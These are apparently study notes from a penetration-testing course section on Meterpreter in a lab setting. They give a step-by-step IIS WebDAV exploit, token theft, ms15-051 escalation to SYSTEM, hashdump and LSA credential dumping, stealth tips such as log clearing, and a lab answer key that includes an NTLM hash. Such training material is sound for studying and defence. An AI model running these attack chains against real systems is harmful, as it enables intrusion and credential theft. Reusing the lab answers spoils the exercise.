# NOTES — Meterpreter

## ID
610

## Module
Using the Metasploit Framework

## Kind
notes

## Title
Section 11 — Meterpreter

## Description
End-to-end Meterpreter usage: stealth/power/extensibility, the help menu surface, post-exploitation chains (IIS WebDAV foothold → token theft → local-exploit-suggester → ms15-051 SYSTEM), and `hashdump` / `lsa_dump_*` for credential extraction. Lab solves FortiLogger arbitrary file upload + `post/windows/gather/hashdump`.

## Tags
metasploit, meterpreter, post-exploitation, token-impersonation, privilege-escalation, hashdump, lsa-secrets, fortilogger, ms15-051, dll-injection

## Commands
- `help` (inside Meterpreter)
- `getuid` / `getpid` / `getprivs` / `getsid`
- `sysinfo`
- `ps` / `pgrep` / `pkill` / `kill`
- `steal_token <pid>` / `drop_token` / `rev2self`
- `migrate <pid>`
- `getsystem` (priv: elevate)
- `shell` → drop into target OS shell (channelized)
- `cat <path>` / `ls` / `cd` / `pwd` / `download` / `upload` / `search`
- `background` / `bg`
- `sessions`
- `hashdump`
- `lsa_dump_sam` / `lsa_dump_secrets`
- `screenshot` / `screenshare` / `keyscan_start` / `keyscan_dump` / `keyscan_stop`
- `webcam_list` / `webcam_snap` / `webcam_stream` / `record_mic`
- `clearev`
- `db_nmap -sV -p- -T5 -A <ip>`
- `search iis_webdav_upload_asp`
- `search local_exploit_suggester`
- `use post/multi/recon/local_exploit_suggester`
- `set SESSION <id>`
- `use exploit/windows/local/ms15_051_client_copy_image`
- `use post/windows/gather/hashdump`

## What This Section Covers
Meterpreter is a multi-faceted, extensible Payload. It's loaded via reflective DLL injection, lives entirely in memory (no disk writes), uses AES-encrypted comms over a channelized socket (MSF6+), and exposes Linux-style commands plus Windows-specific post-ex (hashdump, LSA secrets, token theft, keystroke capture, webcam/mic).

## Design Goals
| Goal | Why it matters |
|------|----------------|
| **Stealthy** | In-memory only, no new processes (injects into compromised process), can migrate between processes, AES-encrypted traffic — limited forensic surface. |
| **Powerful** | Channelized comms means you can spawn a host-OS shell *alongside* Meterpreter on the same connection. |
| **Extensible** | New extensions load over the network at runtime. No re-build needed. |

## Lifecycle (when an exploit succeeds)
1. Target executes initial **stager** (bind / reverse / findtag / passivex / …).
2. Stager loads a DLL prefixed `Reflective`. The Reflective stub handles DLL injection.
3. **Meterpreter core** initializes, opens AES-encrypted link over the socket, sends a `GET`. MSF receives it and configures the client.
4. **Extensions** load over AES. `stdapi` always; `priv` if running with admin rights.

## Help Menu Surface
| Group | Sample commands |
|-------|-----------------|
| Core | `?`, `background`, `bg`, `bgkill`, `bglist`, `bgrun`, `channel`, `close`, `exit`, `info`, `irb`, `load`, `migrate`, `pivot`, `pry`, `quit`, `read`, `resource`, `run`, `secure`, `sessions`, `sleep`, `transport`, `use`, `uuid`, `write` |
| File system | `cat`, `cd`, `checksum`, `cp`, `dir`/`ls`, `download`, `edit`, `getlwd`, `getwd`, `lcd`, `lls`, `lpwd`, `mkdir`, `mv`, `pwd`, `rm`, `rmdir`, `search`, `show_mount`, `upload` |
| Networking | `arp`, `getproxy`, `ifconfig`, `ipconfig`, `netstat`, `portfwd`, `resolve`, `route` |
| System | `clearev`, `drop_token`, `execute`, `getenv`, `getpid`, `getprivs`, `getsid`, `getuid`, `kill`, `localtime`, `pgrep`, `pkill`, `ps`, `reboot`, `reg`, `rev2self`, `shell`, `shutdown`, `steal_token`, `suspend`, `sysinfo` |
| UI | `enumdesktops`, `getdesktop`, `idletime`, `keyboard_send`, `keyevent`, `keyscan_dump`, `keyscan_start`, `keyscan_stop`, `mouse`, `screenshare`, `screenshot`, `setdesktop`, `uictl` |
| Webcam | `record_mic`, `webcam_chat`, `webcam_list`, `webcam_snap`, `webcam_stream` |
| Audio Output | `play` (.wav on target) |
| Elevate | `getsystem` |
| Passwords | `hashdump` |
| Timestamp | `timestomp` |

## Worked Example — IIS 6.0 WebDAV → SYSTEM
```
db_nmap -sV -p- -T5 -A 10.10.10.15        # finds Microsoft IIS httpd 6.0 on port 80
# IIS 6.0 → CVE-2017-7269 → iis_webdav_upload_asp
search iis_webdav_upload_asp
use 0
set RHOST 10.10.10.15
set LHOST tun0
run
# Meterpreter session 1 opens — but as low-priv user

meterpreter > getuid
[-] 1055: Operation failed: Access is denied.

meterpreter > ps                                          # find a higher-priv target proc
meterpreter > steal_token 1836                            # wmiprvse.exe — NETWORK SERVICE
Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Background and chain a local exploit:
```
meterpreter > bg
msf6 > search local_exploit_suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
# → lists candidate priv-esc exploits

msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > set session 1
msf6 > set LHOST tun0
msf6 > run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Credential Extraction
```
hashdump
# Administrator:500:LM:NT:::
# ASPNET:1007:LM:NT:::
# ...

lsa_dump_sam
# Dumps SAM with RID/User/LM/NTLM hashes per account, plus SysKey + SAMKey + Local SID

lsa_dump_secrets
# LSA secrets — service account creds, DPAPI_SYSTEM, NL$KM, _SC_* service principals
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Username of the shell obtained via the existing MSF exploit. | **nt authority\system** | `db_nmap -A --top-ports 60 -T5 <ip>` → port 5000 is FortiLogger → `search FortiLogger` → `use 0` (`exploit/windows/http/fortilogger_arbitrary_fileupload`) → `set LHOST tun0` → `set RHOSTS <ip>` → `exploit` → `shell` → `whoami` |
| Q2 — NTLM password hash for `htb-student`. | **cf3a5525ee9414229e66279623ed5c58** | `background` → `search hashdump post windows` → `use 3` (`post/windows/gather/hashdump`) → `set SESSION 1` → `run` → read the `htb-student:1002:aad3...:cf3a5525ee9414229e66279623ed5c58:::` line |

## Key Takeaways
- `whoami` doesn't exist in Meterpreter — use `getuid`. To get a real shell, `shell` opens a channel into CMD/bash on the target.
- Failing `getuid` after exploitation → check `ps` and use `steal_token <pid>` against a higher-priv process before bothering with priv-esc exploits.
- `local_exploit_suggester` requires an active SESSION — background first, bind with `set SESSION <id>`.
- `migrate <pid>` moves Meterpreter out of the original (often unstable) process into a stable one (e.g. `explorer.exe`) — do this early if your foothold is on a process that might die (web worker, child of a crashed exploit).

## Gotchas
- Many exploit modules leave artifacts on disk (the IIS WebDAV example writes a `metasploit<RAND>.asp` and fails to delete it on access-denied) — a sysadmin who knows the MSF artifact pattern can spot you instantly. Plan cleanup if stealth matters.
- `local_exploit_suggester` outputs lines like "The service is running, but could not be validated." Those are maybes — try them but don't trust the suggester as ground truth.
- An x86 session may show `[!] incompatible session architecture: x86` when running an x64-default priv-esc module. Often still works — read the rest of the output before reaching for `setg arch`.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[10-sessions-and-jobs]] | [[12-writing-importing-modules]] →
<!-- AUTO-LINKS-END -->
